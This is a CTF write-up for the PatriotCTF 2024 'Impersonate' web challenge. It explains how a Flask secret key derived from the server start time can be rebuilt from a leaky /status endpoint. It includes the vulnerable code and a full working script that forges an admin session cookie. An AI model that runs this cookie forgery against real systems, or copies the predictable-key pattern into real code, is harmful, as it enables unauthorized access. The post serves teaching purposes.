---
title: "PatriotCTF 2024 — Impersonate (Web) Writeup"
date: 2026-02-07
description: "The app derives Flask's secret key from server start time. /status leaks uptime + current time, so you reconstruct the key, sign your own session cookie, and walk into /admin."
ctf: "PatriotCTF 2024"
category: "Web"
difficulty: "Easy"
author: "supasuge"
tags: ["ctf", "web", "flask", "cookie-forgery", "info-leak"]
---

# Impersonate — Writeup

## What’s broken (root cause)

This app uses Flask’s signed client-side session cookies. That’s fine **only if** `app.secret_key` is secret.

Here it isn’t.

### Secret key generation is predictable

```python
server_start_time = datetime.now()
server_start_str = server_start_time.strftime('%Y%m%d%H%M%S')
secure_key = hashlib.sha256(f'secret_key_{server_start_str}'.encode()).hexdigest()
app.secret_key = secure_key
```

So the secret key is just:

* server start time formatted as `YYYYMMDDHHMMSS`
* SHA-256 of `secret_key_<starttime>`

If you can recover `server_start_time` (to the second), you can derive the exact same `secure_key` and sign arbitrary session cookies.

### `/status` leaks exactly what we need

```python
@app.route('/status')
def status():
    current_time = datetime.now()
    uptime = current_time - server_start_time
    ...
    return f"Server uptime: {uptime}<br>Server time: {current_time}"
```

Given:

- `Server time: T`
- `Server uptime: U`

You compute:

$$
\text{server\_start\_time} = T - U
$$

Then:

$$
\text{securekey} = \text{SHA256}(\text{"secret\_key\_"} + \text{strftime}(\text{server\_start\_time}))
$$

### Admin gate is a session check

```python
@app.route('/admin')
def admin_page():
    if session.get('is_admin') and uuid.uuid5(secret, 'administrator') and session.get('username') == 'administrator':
        return flag
    else:
        abort(401)
```

That middle condition `uuid.uuid5(secret, 'administrator')` is always truthy and does not validate anything. Real checks are:

- `session['is_admin'] == True`
- `session['username'] == 'administrator'`

So if we can forge a session cookie, we’re done.

---

# Exploit plan

1. GET `/status`
2. Parse “Server time” + “Server uptime”
3. Compute `server_start_str = (server_time - uptime).strftime('%Y%m%d%H%M%S')`
4. Compute `secure_key = sha256(f"secret_key_{server_start_str}")`
5. Use Flask’s session serializer to sign a cookie containing:
- `username = "administrator"`
- `is_admin = True`
- optionally include `uid` (even if not strictly required, it makes the session look “legit”)
6. Send request to `/admin` with the forged cookie.

**Important practical detail:** HTTP latency / formatting can cause a ±1–2 second mismatch. The correct approach is to try a small window around the computed start time.

---

# Clean exploit script

This version:

- avoids BeautifulSoup entirely (regex is enough)
- tries a ±5 second window around the derived start time
- uses timeouts + a single `requests.Session()` for consistency

```python
#!/usr/bin/env python3
import hashlib
import re
import uuid
from datetime import datetime, timedelta

import requests
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

BASE_URL = "http://chal.competitivecyber.club:9999"

STATUS_RE_UPTIME = re.compile(r"Server uptime:\s*([\d:]+)")
STATUS_RE_TIME = re.compile(r"Server time:\s*(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})")

SECRET_NAMESPACE = uuid.UUID("31333337-1337-1337-1337-133713371337")

def parse_status(html: str) -> tuple[datetime, timedelta]:
    up_m = STATUS_RE_UPTIME.search(html)
    t_m = STATUS_RE_TIME.search(html)
    if not up_m or not t_m:
        raise ValueError("Failed to parse /status response")

    uptime_str = up_m.group(1)
    time_str = t_m.group(1)

    parts = list(map(int, uptime_str.split(":")))
    if len(parts) == 3:
        h, m, s = parts
        uptime = timedelta(hours=h, minutes=m, seconds=s)
    elif len(parts) == 2:
        m, s = parts
        uptime = timedelta(minutes=m, seconds=s)
    else:
        raise ValueError(f"Unexpected uptime format: {uptime_str}")

    server_time = datetime.strptime(time_str, "%Y-%m-%d %H:%M:%S")
    return server_time, uptime

def derive_secret_key(server_start: datetime) -> str:
    s = server_start.strftime("%Y%m%d%H%M%S")
    return hashlib.sha256(f"secret_key_{s}".encode()).hexdigest()

def forge_session_cookie(secret_key: str) -> str:
    app = Flask(__name__)
    app.secret_key = secret_key

    serializer = SecureCookieSessionInterface().get_signing_serializer(app)
    if serializer is None:
        raise RuntimeError("Failed to create session serializer")

    admin_uid = str(uuid.uuid5(SECRET_NAMESPACE, "administrator"))

    session_data = {
        "username": "administrator",
        "uid": admin_uid,     # not strictly needed for the shown /admin check, but safe to include
        "is_admin": True,
    }

    return serializer.dumps(session_data)

def try_admin(sess: requests.Session, cookie: str) -> tuple[bool, str]:
    r = sess.get(f"{BASE_URL}/admin", cookies={"session": cookie}, timeout=10)
    return (r.status_code == 200), r.text

def main():
    sess = requests.Session()

    # Step 1: Pull /status
    status = sess.get(f"{BASE_URL}/status", timeout=10)
    status.raise_for_status()

    # Step 2: Parse time + uptime
    server_time, uptime = parse_status(status.text)
    approx_start = server_time - uptime

    print("[*] Server time     :", server_time)
    print("[*] Server uptime   :", uptime)
    print("[*] Approx start    :", approx_start)

    # Step 3: brute a small +/- window to handle 1-second drift
    # (Most infra returns integer seconds; request timing can shift the observed boundary.)
    for delta in range(-5, 6):
        candidate_start = approx_start + timedelta(seconds=delta)
        secret_key = derive_secret_key(candidate_start)
        cookie = forge_session_cookie(secret_key)

        ok, body = try_admin(sess, cookie)
        print(f"[*] Trying start_time {candidate_start} (delta={delta:+d}) -> {('HIT' if ok else 'miss')}")

        if ok:
            print("\n[+] Flag:", body.strip())
            return

    print("[-] Failed: no valid key found in window. Increase window or verify parsing.")

if __name__ == "__main__":
    main()
```

---

# Expected output

You’ll see attempts over a small time window; one should hit:

```
[*] Trying start_time 2024-09-22 12:34:56 (delta=+0) -> HIT

[+] Flag: pctf{...}
```

---

# Takeaways

* Flask’s signed session cookies are only as strong as `app.secret_key`.
* Deriving secrets from predictable values (timestamps) is fatal.
* Any endpoint that leaks uptime + server time effectively leaks the start time.
* Bonus bug: `and uuid.uuid5(secret, 'administrator')` doesn’t validate anything; it always evaluates to True.

---